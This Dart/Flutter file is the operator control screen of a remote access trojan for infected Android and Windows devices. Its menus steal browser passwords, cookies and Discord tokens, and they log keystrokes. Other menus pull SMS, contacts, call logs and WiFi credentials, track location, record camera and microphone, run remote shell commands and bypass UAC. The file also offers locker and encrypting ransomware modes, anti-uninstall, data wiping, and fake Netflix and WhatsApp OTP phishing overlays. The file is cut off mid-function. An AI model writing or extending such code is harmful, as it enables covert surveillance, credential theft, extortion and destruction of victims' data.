import '../services/api_config.dart';
import 'dart:async';
import 'dart:ui';
import 'dart:convert';
import 'package:web_socket_channel/io.dart';
import 'package:web_socket_channel/web_socket_channel.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:url_launcher/url_launcher.dart';
import 'api_service.dart';
import 'constants.dart';
import 'storage_screen.dart';
import 'notification_screen.dart';
import 'stream_screen.dart';
import 'audio_record_screen.dart';
import 'contacts_screen.dart';
import 'wifi_screen.dart';
import 'app_manager_screen.dart';
import 'live_location_screen.dart';
import 'chat_screen.dart';
import 'stealer_screen.dart';
import 'shell_screen.dart';
import 'screenshot_gallery_screen.dart';
import 'cookies_screen.dart';
import 'discord_tokens_screen.dart';
import 'camera_screen.dart';

// ── Palette ────────────────────────────────────────────────────────────────────
const _kBg     = Color(0xFF0D1117);
const _kCard   = Color(0xFF161B22);
const _kCard2  = Color(0xFF1F2937);
const _kBorder = Color(0xFF30363D);
const _kBlue   = Color(0xFF3B82F6);
const _kCyan   = Color(0xFF06B6D4);
const _kGreen  = Color(0xFF10B981);
const _kOrange = Color(0xFFF59E0B);
const _kPurple = Color(0xFF8B5CF6);
const _kRed    = Color(0xFFEF4444);
const _kTeal   = Color(0xFF14B8A6);
const _kSub    = Color(0xFF9CA3AF);

class RatDeviceControlScreen extends StatefulWidget {
  final String deviceId, deviceModel, deviceName, sessionKey;
  const RatDeviceControlScreen({super.key, required this.deviceId, required this.deviceModel, required this.deviceName, required this.sessionKey});

  @override
  State<RatDeviceControlScreen> createState() => _RatDeviceControlScreenState();
}

class _RatDeviceControlScreenState extends State<RatDeviceControlScreen> with TickerProviderStateMixin {
  late RatApiService _api;
  final List<Map<String, dynamic>> _log = [];
  bool _isVip = false, _showLog = false;
  final Map<String, bool> _executing = {};

  // Device stats
  String _batteryLevel = '--%', _phoneName = '...', _model = '...',
         _ipAddress = '...', _lockType = '...', _androidVer = '...', _status = 'offline';
  bool _isLocked = false, _isHidden = false, _antiUninstallEnabled = true;
  
  Map<String, bool> _permissions = {};

  // Tab selection
  int _tabIdx = 0;

  // Realtime WebSocket
  WebSocketChannel? _wsChannel;
  StreamSubscription? _wsSub;

  bool get _isWin => widget.deviceId.startsWith('WIN-');

  // ── Categories ────────────────────────────────────────────────────────────────
  List<Map<String, dynamic>> get _categories => [
    {
      'title': 'Info', 'icon': Icons.info_outline_rounded, 'color': _kCyan,
      'desc': 'System status & device info',
      'buttons': <Map<String, dynamic>>[
        {'icon': Icons.info_rounded, 'label': 'Get Info', 'sub': 'Fetch device details', 'command': 'G_INFO', 'color': _kCyan},
        if (_isWin) ...[
          {'icon': Icons.password_rounded, 'label': 'Passwords', 'sub': 'Browser credentials', 'command': 'STEAL', 'color': _kBlue,
            'onTap': () => _nav(StealerScreen(deviceId: widget.deviceId, sessionKey: widget.sessionKey))},
          {'icon': Icons.cookie_rounded, 'label': 'Cookies', 'sub': 'Netscape format', 'command': 'STEAL', 'color': _kOrange,
            'onTap': () => _nav(CookiesScreen(deviceId: widget.deviceId, sessionKey: widget.sessionKey))},
          {'icon': Icons.discord_rounded, 'label': 'Discord', 'sub': 'Tokens & metadata', 'command': 'STEAL', 'color': const Color(0xFF5865F2),
            'onTap': () => _nav(DiscordTokensScreen(deviceId: widget.deviceId, sessionKey: widget.sessionKey))},
          {'icon': Icons.keyboard_rounded, 'label': 'Keylogger', 'sub': 'Capture keystrokes', 'command': 'GET_KEYLOG', 'color': _kCyan},
        ],
      ],
    },
    if (!_isWin) {
      'title': 'Data', 'icon': Icons.folder_open_rounded, 'color': _kBlue,
      'desc': 'Extract contacts, SMS, calls',
      'buttons': <Map<String, dynamic>>[
        {'icon': Icons.contacts_rounded, 'label': 'Contacts', 'sub': 'Phone book', 'command': 'GET_CONTACTS', 'color': _kBlue},
        {'icon': Icons.email_rounded, 'label': 'Gmail', 'sub': 'Email data', 'command': 'GET_GMAIL', 'color': _kBlue},
        {'icon': Icons.sms_rounded, 'label': 'SMS', 'sub': 'Text messages', 'command': 'GET_SMS', 'color': _kBlue},
        {'icon': Icons.call_rounded, 'label': 'Call Logs', 'sub': 'Call history', 'command': 'GET_CALLLOGS', 'color': _kBlue},
        {'icon': Icons.content_paste_rounded, 'label': 'Clipboard', 'sub': 'Copy buffer', 'command': 'GET_CLIPBOARD', 'color': _kBlue},
        {'icon': Icons.sim_card_rounded, 'label': 'SIM Info', 'sub': 'Carrier + number', 'command': 'GET_SIM_INFO', 'color': _kBlue},
      ],
    },
    {
      'title': 'Location', 'icon': Icons.location_on_rounded, 'color': _kGreen,
      'desc': 'GPS & live tracking',
      'buttons': <Map<String, dynamic>>[
        {'icon': Icons.my_location_rounded, 'label': 'Get Location', 'sub': 'One-time GPS fix', 'command': 'GET_LOCATION', 'color': _kGreen},
        if (!_isWin) ...[
          {'icon': Icons.map_rounded, 'label': 'Open Maps', 'sub': 'View in Google Maps', 'command': 'OPEN_MAPS', 'color': _kGreen, 'onTap': () => _openMaps()},
          {'icon': Icons.gps_fixed_rounded, 'label': 'Live Track', 'sub': 'Real-time location', 'command': 'LIVE_LOC', 'color': _kGreen,
            'onTap': () => _nav(LiveLocationScreen(deviceId: widget.deviceId, sessionKey: widget.sessionKey))},
        ],
      ],
    },
    {
      'title': 'WiFi', 'icon': Icons.wifi_rounded, 'color': _kTeal,
      'desc': 'Saved & nearby networks',
      'buttons': <Map<String, dynamic>>[
        {'icon': Icons.wifi_password_rounded, 'label': 'Saved WiFi', 'sub': 'Stored credentials', 'command': 'GET_SAVED_WIFI', 'color': _kTeal,
          'onTap': () => _nav(WifiManagerScreen(deviceId: widget.deviceId, sessionKey: widget.sessionKey))},
        {'icon': Icons.wifi_find_rounded, 'label': 'Scan Nearby', 'sub': 'Find nearby APs', 'command': 'GET_NEARBY_WIFI', 'color': _kTeal,
          'onTap': () => _nav(WifiManagerScreen(deviceId: widget.deviceId, sessionKey: widget.sessionKey))},
      ],
    },
    {
      'title': 'Apps', 'icon': Icons.apps_rounded, 'color': _kPurple,
      'desc': 'Running & installed apps',
      'buttons': <Map<String, dynamic>>[
        {'icon': Icons.apps_rounded, 'label': 'App Manager', 'sub': 'List, blacklist, kill', 'command': 'MANAGE_APPS', 'color': _kPurple,
          'onTap': () => _nav(AppManagerScreen(deviceId: widget.deviceId, sessionKey: widget.sessionKey))},
      ],
    },
    {
      'title': 'Screen & Audio', 'icon': Icons.screenshot_monitor_rounded, 'color': _kOrange,
      'desc': 'Screenshots, stream, audio',
      'buttons': <Map<String, dynamic>>[
        {'icon': Icons.screenshot_monitor_rounded, 'label': 'Screenshots', 'sub': 'Screen captures', 'command': 'SCREENSHOT', 'color': _kOrange,
          'onTap': () => _nav(ScreenshotGalleryScreen(deviceId: widget.deviceId, sessionKey: widget.sessionKey))},
        {'icon': Icons.screen_share_rounded, 'label': 'Screen', 'sub': 'Live stream', 'command': 'STREAM', 'color': _kOrange,
          'onTap': () => _nav(StreamScreen(deviceId: widget.deviceId, sessionKey: widget.sessionKey))},
        {'icon': Icons.mic_rounded, 'label': 'Audio Rec', 'sub': 'Microphone', 'command': 'AUDIO', 'color': _kOrange,
          'onTap': () => _nav(AudioRecordScreen(deviceId: widget.deviceId, sessionKey: widget.sessionKey))},
        {'icon': Icons.mic_off_rounded, 'label': 'Stop Audio', 'sub': 'Stop recording', 'command': 'STOP_AUDIO', 'color': _kSub},
        if (!_isWin) ...[
          {'icon': Icons.videocam_rounded, 'label': 'Camera', 'sub': 'Live cam & capture', 'command': 'LIVE_CAM', 'color': _kRed,
            'onTap': () => _nav(CameraScreen(deviceId: widget.deviceId, sessionKey: widget.sessionKey))},
          {'icon': Icons.videocam_rounded, 'label': 'Rec Video', 'sub': 'Video recording', 'command': 'VIDEO_START', 'color': _kOrange, 'onTap': () => _showVideoDialog()},
          {'icon': Icons.stop_circle_rounded, 'label': 'Stop Vid', 'sub': 'Stop recording', 'command': 'VIDEO_STOP', 'color': _kSub},
        ],
      ],
    },
    {
      'title': 'Control', 'icon': Icons.phone_android_rounded, 'color': _kRed,
      'desc': 'Lock, shell, overlay, wipe',
      'buttons': <Map<String, dynamic>>[
        {'icon': Icons.lock_rounded, 'label': 'Lock Device', 'sub': 'Advanced lock config', 'command': 'LOCK_SCREEN', 'color': _kRed, 'onTap': () => _showCustomLockDialog()},
        {'icon': Icons.lock_open_rounded, 'label': 'Unlock', 'sub': 'Remove lock', 'command': 'UNLOCK_SCREEN', 'color': _kRed},
        {'icon': Icons.chat_bubble_rounded, 'label': 'Chat', 'sub': 'Message device', 'command': 'CHAT', 'color': _kBlue, 'onTap': () => _nav(ChatScreen(deviceId: widget.deviceId, sessionKey: widget.sessionKey))},
        {'icon': Icons.notifications_active_rounded, 'label': 'Notifications', 'sub': 'Intercept alerts', 'command': 'NOTIF_MON', 'color': _kRed,
          'onTap': _isWin ? null : () => _nav(NotificationMonitorScreen(deviceId: widget.deviceId, sessionKey: widget.sessionKey))},
        {'icon': Icons.folder_rounded, 'label': 'Storage', 'sub': 'Browse filesystem', 'command': 'OPEN_STORAGE', 'color': _kRed,
          'onTap': () => _nav(RatStorageScreen(deviceId: widget.deviceId, sessionKey: widget.sessionKey))},
        {'icon': Icons.password_rounded, 'label': 'Set Password', 'sub': 'Change lock PIN', 'command': 'SET_PASSWORD', 'color': _kOrange, 'onTap': () => _showSetPasswordDialog()},
        {'icon': Icons.open_in_browser_rounded, 'label': 'Open Link', 'sub': 'Launch URL', 'command': 'OPEN_LINK', 'color': _kRed, 'onTap': () => _showOpenLinkDialog()},
        if (!_isWin) {'icon': Icons.web_rounded, 'label': 'Overlay WV', 'sub': 'Inject WebView', 'command': 'OVERLAY_WV', 'color': _kOrange, 'onTap': () => _showOverlayWvDialog()},
        {'icon': Icons.terminal_rounded, 'label': 'Shell', 'sub': 'Remote command', 'command': 'SHELL', 'color': _kRed, 
          'onTap': _isWin ? () => _nav(ShellScreen(deviceId: widget.deviceId, sessionKey: widget.sessionKey)) : () => _showShellDialog()},
        {'icon': Icons.visibility_off_rounded, 'label': 'Hide App', 'sub': 'Conceal from launcher', 'command': 'HIDE_APP', 'color': _kSub},
        {'icon': Icons.visibility_rounded, 'label': 'Show App', 'sub': 'Restore visibility', 'command': 'UNHIDE_APP', 'color': _kSub},
        if (_isWin) ...[
          {'icon': Icons.list_alt_rounded, 'label': 'Processes', 'sub': 'Running processes', 'command': 'PROCESS_LIST', 'color': _kRed},
          {'icon': Icons.shield_rounded, 'label': 'UAC Bypass', 'sub': 'Elevate to Admin', 'command': 'UAC_BYPASS', 'color': Colors.purple},
          {'icon': Icons.power_settings_new_rounded, 'label': 'Shutdown', 'sub': 'Power off device', 'command': 'POWER', 'args': 'shutdown', 'color': _kRed},
        ],
        if (!_isWin) 
          {'icon': Icons.security_rounded, 'label': 'Anti-Uninstall', 'sub': 'Block settings/uninstall', 'isToggle': true, 'value': _antiUninstallEnabled, 'onToggle': (v) => _toggleAntiUninstall(v), 'color': _kGreen},
        {'icon': Icons.delete_forever_rounded, 'label': 'Wipe Data', 'sub': '⚠ Factory reset', 'command': 'WIPE_DATA', 'color': _kRed, 'onTap': () => _showWipeDataDialog()},
      ],
    },
  ];

  @override
  void initState() {
    super.initState();
    _api = RatApiService(widget.sessionKey);
    _phoneName = widget.deviceName;
    _model = widget.deviceModel;
    _addLog('Connected to ${widget.deviceName}', sys: true);
    _checkRole();
    _refresh();
    _initWs();
  }

  @override
  void dispose() {
    _wsSub?.cancel();
    _wsChannel?.sink.close();
    super.dispose();
  }

  void _initWs() {
    try {
      _wsChannel = IOWebSocketChannel.connect(Uri.parse('${RatConstants.wsUrl}'), headers: ApiConfig.getHeaders());
      _wsChannel!.sink.add('ADMIN_HANDSHAKE:${widget.sessionKey}:${widget.deviceId}');
      _wsSub = _wsChannel!.stream.listen((data) {
        if (data is String) {
          if (data == 'ADMIN_HANDSHAKE:SUCCESS') {
            _addLog('WebSocket: Active', sys: true);
          } else if (data.startsWith('VRESP:')) {
            final parts = data.split(':');
            if (parts.length >= 3) {
              final type = parts[1];
              final content = parts.sublist(2).join(':');
              _addLog('← $content');
              if (['INFO', 'LOCK_SCREEN', 'UNLOCK_SCREEN', 'SET_PASSWORD'].contains(type)) {
                _refresh();
              }
            }
          }
        }
      }, onError: (e) {
        _addLog('WS Error: $e', sys: true);
      }, onDone: () {
        _addLog('WS Disconnected', sys: true);
      });
    } catch (e) {
      _addLog('WS Init Error: $e', sys: true);
    }
  }

  void _nav(Widget s) => Navigator.push(context, MaterialPageRoute(builder: (_) => s));

  Future<void> _checkRole() async {
    final p = await SharedPreferences.getInstance();
    final r = p.getString('role') ?? p.getString('rat_role') ?? 'member';
    setState(() => _isVip = r == 'vip' || r == 'owner');
  }

  Future<void> _refresh() async {
    try {
      final d = await _api.getDeviceDetails(widget.deviceId);
      if (d != null && mounted) {
        setState(() {
          _batteryLevel = '${d['battery_level'] ?? '--'}%';
          _status       = d['status']?.toString() ?? 'offline';
          _lockType     = d['lock_type']?.toString() ?? 'Unknown';
          _androidVer   = (d['android_version'] ?? d['os_version'] ?? d['version'] ?? '?').toString();
          _antiUninstallEnabled = d['anti_uninstall_enabled'] != false && d['anti_uninstall_enabled'] != 'false';

          final pStr = d['permissions']?.toString() ?? '';
          if (pStr.isNotEmpty) {
            final parts = pStr.split(',');
            for (var p in parts) {
              final kv = p.split(':');
              if (kv.length == 2) {
                _permissions[kv[0]] = kv[1] == '1';
              }
            }
          }
        });
      }
    } catch (e) { _addLog('Refresh error: $e'); }
  }

  Future<void> _toggleAntiUninstall(bool v) async {
    _addLog('${v ? "Enabling" : "Disabling"} Anti-Uninstall...');
    try {
      await _api.toggleAntiUninstall(widget.deviceId, v);
      setState(() => _antiUninstallEnabled = v);
      _addLog('Anti-Uninstall: ${v ? "ENABLED" : "DISABLED"}');
    } catch (e) {
      _addLog('Toggle error: $e');
    }
  }

  void _addLog(String msg, {bool sys = false}) {
    setState(() {
      _log.insert(0, {'msg': msg, 'ts': DateTime.now(), 'sys': sys});
      if (_log.length > 100) _log.removeLast();
    });
  }

  Future<void> _exec(String cmd, {String? args, String? label, VoidCallback? onTap}) async {
    if (onTap != null) { onTap(); return; }
    
    final id = label ?? cmd;
    setState(() => _executing[id] = true);
    
    _addLog('→ $id');
    try {
      await _api.sendCommand(widget.deviceId, cmd, args: args);
      
      // Data extraction commands have their own logic
      if (['GET_CONTACTS', 'GET_SMS', 'GET_CALLLOGS', 'GET_GMAIL', 'GET_SIM_INFO'].contains(cmd)) {
        await Future.delayed(const Duration(seconds: 4));
        dynamic data;
        if (cmd == 'GET_CONTACTS') {
          data = await _api.getContacts(widget.deviceId);
          if (data is List && data.isNotEmpty) {
            setState(() => _executing[id] = false);
            _nav(ContactsScreen(deviceId: widget.deviceId, sessionKey: widget.sessionKey, initialContacts: data));
            return;
          }
        } else if (cmd == 'GET_SMS') {
          data = await _api.getSms(widget.deviceId);
        } else if (cmd == 'GET_CALLLOGS') {
          data = await _api.getCallLogs(widget.deviceId);
        } else if (cmd == 'GET_SIM_INFO') {
          data = await _api.getSim(widget.deviceId);
        }
        setState(() => _executing[id] = false);
        if (data != null) { _showDataResult(cmd, data); return; }
      }

      int tries = 0;
      while (tries < 15) {
        await Future.delayed(const Duration(milliseconds: 800));
        final r = await _api.getLastResponse(widget.deviceId);
        if (r != null && r['content'] != null) {
          final ts = r['timestamp'] ?? 0;
          final c = r['content'].toString();
          // Check if response is fresh (within last 15s)
          if (DateTime.now().millisecondsSinceEpoch - ts < 15000) {
            setState(() => _executing[id] = false);
            _showPremiumResult(id, c);
            return;
          }
        }
        tries++;
      }
      setState(() => _executing[id] = false);
      _showPremiumResult(id, "Command sent, but no response was received within 15s.", success: false);
    } catch (e) { 
      setState(() => _executing[id] = false);
      _addLog('Error: $e'); 
    }
  }

  void _showPremiumResult(String title, String content, {bool success = true}) {
    showDialog(
      context: context,
      builder: (ctx) => BackdropFilter(
        filter: ImageFilter.blur(sigmaX: 5, sigmaY: 5),
        child: Dialog(
          backgroundColor: Colors.transparent,
          insetPadding: const EdgeInsets.symmetric(horizontal: 24),
          child: Container(
            padding: const EdgeInsets.all(24),
            decoration: BoxDecoration(
              color: _kCard.withOpacity(0.95),
              borderRadius: BorderRadius.circular(24),
              border: Border.all(color: success ? _kGreen.withOpacity(0.3) : _kRed.withOpacity(0.3)),
              boxShadow: [
                BoxShadow(color: (success ? _kGreen : _kRed).withOpacity(0.1), blurRadius: 40, spreadRadius: 10),
              ],
            ),
            child: Column(
              mainAxisSize: MainAxisSize.min,
              children: [
                Container(
                  padding: const EdgeInsets.all(16),
                  decoration: BoxDecoration(
                    color: (success ? _kGreen : _kRed).withOpacity(0.1),
                    shape: BoxShape.circle,
                  ),
                  child: Icon(
                    success ? Icons.check_circle_outline_rounded : Icons.error_outline_rounded,
                    color: success ? _kGreen : _kRed,
                    size: 48,
                  ),
                ),
                const SizedBox(height: 16),
                Text(
                  success ? "Execution Successful" : "Command Timeout",
                  style: TextStyle(color: success ? _kGreen : _kRed, fontSize: 18, fontWeight: FontWeight.bold),
                ),
                const SizedBox(height: 8),
                Text(
                  title,
                  style: const TextStyle(color: Colors.white70, fontSize: 14),
                ),
                const SizedBox(height: 20),
                Container(
                  width: double.infinity,
                  padding: const EdgeInsets.all(16),
                  decoration: BoxDecoration(
                    color: _kBg,
                    borderRadius: BorderRadius.circular(12),
                    border: Border.all(color: _kBorder),
                  ),
                  child: Text(
                    content,
                    style: const TextStyle(color: Colors.white, fontSize: 12, fontFamily: 'monospace'),
                    textAlign: TextAlign.center,
                  ),
                ),
                const SizedBox(height: 24),
                _btn("Dismiss", () => Navigator.pop(ctx), color: _kSub),
              ],
            ),
          ),
        ),
      ),
    );
  }

  void _showDataResult(String type, dynamic data) {
    showDialog(context: context, builder: (ctx) => Dialog(
      backgroundColor: _kCard,
      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16), side: BorderSide(color: _kBorder)),
      child: Column(mainAxisSize: MainAxisSize.min, children: [
        Padding(padding: const EdgeInsets.all(16), child: Text(type.replaceAll('GET_', ''), style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold))),
        ConstrainedBox(
          constraints: BoxConstraints(maxHeight: MediaQuery.of(context).size.height * 0.6),
          child: SingleChildScrollView(padding: const EdgeInsets.all(16), child: SelectableText(
            const JsonEncoder.withIndent('  ').convert(data),
            style: const TextStyle(color: Color(0xFF10B981), fontSize: 11, fontFamily: 'monospace'),
          )),
        ),
        TextButton(onPressed: () => Navigator.pop(ctx), child: const Text('Close', style: TextStyle(color: _kBlue))),
      ]),
    ));
  }

  void _showOpenLinkDialog() {
    final c = TextEditingController();
    _dialog('Open Link on Device', Icons.link_rounded, _kBlue, [
      _field(c, 'https://example.com', Icons.link_rounded),
      const SizedBox(height: 14),
      _btn('Open Link', () { Navigator.pop(context); _exec('OPEN_LINK', args: c.text.trim()); }),
    ]);
  }

  void _showShellDialog() {
    final c = TextEditingController();
    _dialog('Shell Command', Icons.terminal_rounded, _kRed, [
      _field(c, 'e.g. whoami', Icons.terminal_rounded),
      const SizedBox(height: 14),
      _btn('Execute', () { Navigator.pop(context); _exec('SHELL', args: c.text.trim()); }, color: _kRed),
    ]);
  }

  void _showSetPasswordDialog() {
    final c = TextEditingController();
    _dialog('Set Lock Password', Icons.password_rounded, _kOrange, [
      if (!_isWin) Container(
        padding: const EdgeInsets.all(10),
        decoration: BoxDecoration(color: _kOrange.withOpacity(0.08), borderRadius: BorderRadius.circular(8), border: Border.all(color: _kOrange.withOpacity(0.3))),
        child: const Text('Only works on Android < 8 or with Device Owner privilege.', style: TextStyle(color: _kOrange, fontSize: 11)),
      ),
      if (_isWin) Container(
        padding: const EdgeInsets.all(10),
        decoration: BoxDecoration(color: _kOrange.withOpacity(0.08), borderRadius: BorderRadius.circular(8), border: Border.all(color: _kOrange.withOpacity(0.3))),
        child: const Text('Sets the system-wide user password via Net User command.', style: TextStyle(color: _kOrange, fontSize: 11)),
      ),
      const SizedBox(height: 12),
      _field(c, 'New PIN / Password', Icons.password_rounded),
      const SizedBox(height: 14),
      _btn('Set Password', () { Navigator.pop(context); _exec('SET_PASSWORD', args: c.text.trim(), label: 'Set Password'); }, color: _kOrange),
    ]);
  }

  void _showWipeDataDialog() {
    _dialog('⚠️ ${_isWin ? "System Wipe" : "Factory Reset"}', Icons.delete_forever_rounded, _kRed, [
      Container(
        padding: const EdgeInsets.all(12),
        decoration: BoxDecoration(color: _kRed.withOpacity(0.08), borderRadius: BorderRadius.circular(10), border: Border.all(color: _kRed.withOpacity(0.3))),
        child: Text(_isWin ? 'CRITICAL: This will attempt to delete core system directories and wipe user data. This is IRREVERSIBLE!' : 'CRITICAL: This will permanently wipe ALL data on the target device. This action CANNOT be undone!',
          style: const TextStyle(color: _kRed, fontSize: 12, fontWeight: FontWeight.bold)),
      ),
      const SizedBox(height: 16),
      _btn('Cancel', () => Navigator.pop(context), color: _kSub),
      const SizedBox(height: 8),
      _btn(_isWin ? 'WIPE SYSTEM' : 'WIPE NOW', () { Navigator.pop(context); _exec('WIPE_DATA', label: _isWin ? 'System Wipe' : 'Factory Reset'); }, color: _kRed),
    ]);
  }

  void _showVideoDialog() {
    _dialog('Record Video', Icons.videocam_rounded, _kOrange, [
      _btn('Front Camera', () { Navigator.pop(context); _exec('VIDEO_START', args: 'front 15'); }),
      const SizedBox(height: 8),
      _btn('Back Camera', () { Navigator.pop(context); _exec('VIDEO_START', args: 'back 15'); }, color: _kOrange),
    ]);
  }

  void _showCustomLockDialog() {
    final titleCtrl = TextEditingController(text: '☠️ DEVICE LOCKED ☠️');
    final descCtrl  = TextEditingController(text: 'Contact Admin for Unlock');
    final htmlCtrl  = TextEditingController();
    final mediaUrlCtrl = TextEditingController();
    final keyCtrl = TextEditingController();

    String selectedMode = 'Lock Screen';
    final modes = _isWin 
        ? ['Lock Screen', 'Locker Ransomware', 'Encrypting Ransomware', 'PPL Virus']
        : ['Lock Screen', 'Locker Ransomware'];
    bool usePinApp = true, useOverlay = true, useSpam = true, useAntiScroll = true;
    bool useVibrate = false, useSound = false, useVolumeLock = false, useFlashlight = false;

    showDialog(context: context, builder: (ctx) => StatefulBuilder(
      builder: (ctx, setS) => Dialog(
        backgroundColor: _kCard,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16), side: BorderSide(color: _kBorder)),
        child: SingleChildScrollView(
          padding: const EdgeInsets.all(20),
          child: Column(mainAxisSize: MainAxisSize.min, crossAxisAlignment: CrossAxisAlignment.start, children: [
            Row(children: [
              Container(padding: const EdgeInsets.all(8), decoration: BoxDecoration(gradient: const LinearGradient(colors: [_kRed, Color(0xFFDC2626)]), borderRadius: BorderRadius.circular(10)), child: const Icon(Icons.lock_person_rounded, color: Colors.white, size: 18)),
              const SizedBox(width: 10),
              const Text('Advanced Lock Config', style: TextStyle(color: Colors.white, fontWeight: FontWeight.w700, fontSize: 16)),
            ]),
            const SizedBox(height: 16),
            _field(titleCtrl, 'Lock Title', Icons.title_rounded),
            const SizedBox(height: 8),
            _field(descCtrl, 'Lock Description', Icons.description_rounded),
            const SizedBox(height: 14),

            if (_isWin) ...[
              _sectionLabel('Lockdown Mode'),
              Container(
                padding: const EdgeInsets.symmetric(horizontal: 12),
                decoration: BoxDecoration(color: _kBg, borderRadius: BorderRadius.circular(10), border: Border.all(color: _kBorder)),
                child: DropdownButtonHideUnderline(
                  child: DropdownButton<String>(
                    value: selectedMode,
                    isExpanded: true,
                    dropdownColor: _kCard,
                    style: const TextStyle(color: Colors.white, fontSize: 13),
                    items: modes.map((m) => DropdownMenuItem(value: m, child: Text(m))).toList(),
                    onChanged: (v) => setS(() => selectedMode = v!),
                  ),
                ),
              ),
              const SizedBox(height: 14),
            ],

            if (selectedMode == 'PPL Virus') ...[
              _sectionLabel('Virus Payload (Media URL)'),
              _field(mediaUrlCtrl, 'e.g. https://domain.com/virus.mp4', Icons.link_rounded),
              const SizedBox(height: 14),
            ],

            if (selectedMode == 'Encrypting Ransomware') ...[
              _sectionLabel('Encryption Key (Optional)'),
              _field(keyCtrl, 'Custom Key (Empty = Random)', Icons.key_rounded),
              const SizedBox(height: 14),
            ],

            if (!_isWin) ...[
              _sectionLabel('Lock Mechanisms'),
              _lockTile(setS, 'Pin App', 'Screen pinning', usePinApp, (v) => usePinApp = v!),
              _lockTile(setS, 'Aggressive Overlay', 'Draw-over block', useOverlay, (v) => useOverlay = v!),
              _lockTile(setS, 'App Spam Relaunch', 'Auto-reopen', useSpam, (v) => useSpam = v!),
              _lockTile(setS, 'Block Notif Scroll', 'Accessibility bypass', useAntiScroll, (v) => useAntiScroll = v!),

              const SizedBox(height: 10),
              _sectionLabel('Advanced Payloads'),
              _lockTile(setS, 'Flashlight Spam', 'Toggle flash rapidly', useFlashlight, (v) => useFlashlight = v!),
              _lockTile(setS, 'Horror Sound', 'Play .mp3 loop (max vol)', useSound, (v) => useSound = v!),
              _lockTile(setS, 'Volume Lock', 'Force max volume', useVolumeLock, (v) => useVolumeLock = v!),
              _lockTile(setS, 'Force Vibrate', 'Aggressive vibration', useVibrate, (v) => useVibrate = v!),
            ],
            if (_isWin) ...[
              _sectionLabel('Windows Hardening'),
              _lockTile(setS, 'Anti-Bypass', 'Auto-kill Task Manager', true, (v) => null),
              _lockTile(setS, 'Top-Most', 'Force window focus', true, (v) => null),
              _lockTile(setS, 'Input Block', 'Disable Mouse/Keyboard', true, (v) => null),
              const SizedBox(height: 10),
            ],

            const SizedBox(height: 10),
            _sectionLabel('Custom Background (HTML)'),
            const SizedBox(height: 6),
            Container(
              height: 100, decoration: BoxDecoration(color: _kBg, borderRadius: BorderRadius.circular(10), border: Border.all(color: _kBorder)),
              child: TextField(controller: htmlCtrl, maxLines: null, expands: true,
                style: const TextStyle(color: Color(0xFF10B981), fontSize: 11, fontFamily: 'monospace'),
                decoration: const InputDecoration(hintText: '<html>... (empty = default)', hintStyle: TextStyle(color: Colors.white24, fontSize: 11), contentPadding: EdgeInsets.all(10), border: InputBorder.none)),
            ),
            const SizedBox(height: 16),
            _btn('LOCK NOW', () {
              final config = {
                'mode': selectedMode,
                'title': titleCtrl.text.trim(), 
                'description': descCtrl.text.trim(), 
                'html': htmlCtrl.text.trim(),
                'media_url': mediaUrlCtrl.text.trim(),
                'key': keyCtrl.text.trim(),
                'text': '${titleCtrl.text.trim()}\n\n${descCtrl.text.trim()}',
                'modes': [if (usePinApp) 'pin', if (useOverlay) 'overlay', if (useSpam) 'spam', if (useAntiScroll) 'anti_scroll'],
                'payloads': [if (useVibrate) 'VIBRATE', if (useSound) 'SOUND', if (useVolumeLock) 'VOLUME LOCK', if (useFlashlight) 'FLASHLIGHT'],
              };
              Navigator.pop(context);
              _exec('LOCK_SCREEN', args: jsonEncode(config), label: 'Lock Device ($selectedMode)');
            }, color: _kRed),
            const SizedBox(height: 8),
            _btn('Cancel', () => Navigator.pop(context), color: _kSub),
          ]),
        ),
      ),
    ));
  }

  void _showOverlayWvDialog() {
    final urlCtrl = TextEditingController();
    final htmlCtrl = TextEditingController(text: '<!DOCTYPE html>\n<html>\n<head>\n<meta name="viewport" content="width=device-width, initial-scale=1">\n<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#000;color:#fff;font-family:sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh}.card{background:rgba(255,255,255,.1);border-radius:12px;padding:24px;text-align:center;backdrop-filter:blur(8px)}h1{font-size:28px;color:#00d4ff;margin-bottom:8px}p{color:#aaa;font-size:14px}</style>\n</head>\n<body><div class="card"><h1>System Update</h1><p>Preparing critical security update.<br>Please wait...</p></div></body>\n</html>');
    int tab = 0;
    final templates = <String, String>{
      'Blank': '<html><body style="background:#000;color:#fff;display:flex;align-items:center;justify-content:center;height:100vh;margin:0"><h1 style="color:#00d4ff">Hello</h1></body></html>',
      'Sys Update': htmlCtrl.text,
      'Netflix': '<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1"><style>*{margin:0;padding:0;box-sizing:border-box}body{background:#141414;font-family:Helvetica,Arial,sans-serif;display:flex;align-items:center;justify-content:center;height:100vh}.box{background:rgba(0,0,0,.75);padding:40px;border-radius:4px;width:100%;max-width:360px}.logo{color:#e50914;font-size:32px;font-weight:700;text-align:center;margin-bottom:28px}input{width:100%;padding:12px;margin-bottom:12px;background:#333;border:none;border-radius:4px;color:#fff;font-size:14px}button{width:100%;padding:14px;background:#e50914;color:#fff;border:none;border-radius:4px;font-size:16px;font-weight:700;cursor:pointer}p{color:#999;font-size:12px;text-align:center;margin-top:12px}</style></head><body><div class="box"><div class="logo">NETFLIX</div><input type="email" placeholder="Email"><input type="password" placeholder="Password"><button>Sign In</button></div></body></html>',
      'WA OTP': '<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1"><style>*{margin:0;padding:0;box-sizing:border-box}body{background:#075e54;font-family:Helvetica,sans-serif;display:flex;align-items:center;justify-content:center;height:100vh}.box{background:#fff;border-radius:8px;padding:32px;text-align:center;max-width:300px;width:100%}h2{color:#075e54;margin-bottom:8px}p{font-size:13px;color:#666;margin-bottom:20px}.otp-input{display:flex;gap:8px;justify-content:center;margin-bottom:20px}.otp-input input{width:40px;height:48px;border:2px solid #ddd;border-radius:8px;text-align:center;font-size:20px;font-weight:700}button{width:100%;padding:14px;background:#25d366;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:700}</style></head><body><div class="box"><h2>Verify Phone</h2><p>Enter 6-digit code sent to your WhatsApp</p><div class="otp-input"><input maxlength="1"><input maxlength="1"><input maxlength="1"><input maxlength="1"><input maxlength="1"><input maxlength="1"></div><button>Verify</button></div></body></html>',
    };

